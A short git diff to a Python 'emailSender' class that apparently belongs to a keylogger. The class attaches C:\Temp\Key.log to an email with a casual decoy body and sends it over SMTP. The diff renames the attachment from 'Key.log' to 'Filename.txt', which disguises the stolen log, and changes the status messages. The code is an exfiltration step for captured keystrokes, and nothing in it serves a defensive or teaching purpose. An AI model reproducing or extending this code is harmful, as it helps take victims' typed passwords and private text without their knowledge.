@@ -21,7 +21,7 @@ class emailSender:
             body = 'Hey, what up'
 
             msg.attach( MIMEText( body, "plain" ) )
-            filename = "Key.log"
+            filename = "Filename.txt"
             attachment = open( 'C:\\Temp\\Key.log', "rb" )
 
             part = MIMEBase( "application", "octet-stream" )
@@ -42,12 +42,13 @@ class emailSender:
             server.sendmail( user, to, Text )
             server.quit()
 
+        # Email Sent
         except smtplib.SMTPConnectError:
             print( "Error Connection" )
         except smtplib.SMTPServerDisconnected:
             print( 'Server refused' )
         else:
-            print( "Job done" )
+            print( "Email Sent" )
 
 
 emailSender.Email()
